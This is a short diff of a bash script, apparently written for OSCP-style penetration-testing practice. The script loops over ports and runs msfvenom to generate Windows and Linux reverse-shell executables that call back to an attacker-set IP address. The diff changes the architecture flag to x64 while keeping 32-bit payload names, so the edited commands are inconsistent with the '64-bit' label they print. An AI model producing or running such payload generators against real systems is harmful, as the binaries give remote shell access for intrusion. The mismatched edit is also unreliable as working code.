@@ -27,10 +27,10 @@ done
 for PORT in ${ports[@]}
 do 
     echo -e $GREEN"\n\nCreating windows 64-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
-    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f exe -o reverse_$PORT.exe
+    msfvenom -a x64 --platform Windows -p windows/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f exe -o reverse_$PORT.exe
 
     echo -e $GREEN"\n\nCreating linux 64-bit reverse shell for IP: $YLW $oscpip$GREEN on port$YLW $PORT$GREEN..."$ENDC
-    msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f elf -o reverse_$PORT
+    msfvenom -a x64 --platform linux -p linux/x86/shell_reverse_tcp LHOST=$oscpip LPORT=$PORT -f elf -o reverse_$PORT
 
 done
 
